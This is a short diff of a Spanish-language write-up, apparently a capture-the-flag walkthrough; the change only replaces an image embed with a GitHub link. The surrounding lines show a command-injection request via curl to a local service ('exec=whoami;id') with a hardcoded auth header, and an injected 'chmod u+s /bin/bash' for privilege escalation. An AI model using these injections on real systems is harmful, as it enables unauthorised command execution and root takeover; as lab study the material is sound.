@@ -125,7 +125,9 @@ y ahora quedaría así:
     curl 127.0.0.1:8081?exec=whoami%3Bid -H "Authorization: Basic we_are_bones_513546516486484"
 
 que nos da los grupos con el id
-![[grupo1.png]]
+
+![image](https://github.com/user-attachments/assets/f40edb7f-efa0-458f-8859-6703161115c9)
+
 
 ya que funciona le intentamos dar permisos así:
 > whoami;chmod u+s /bin/bash
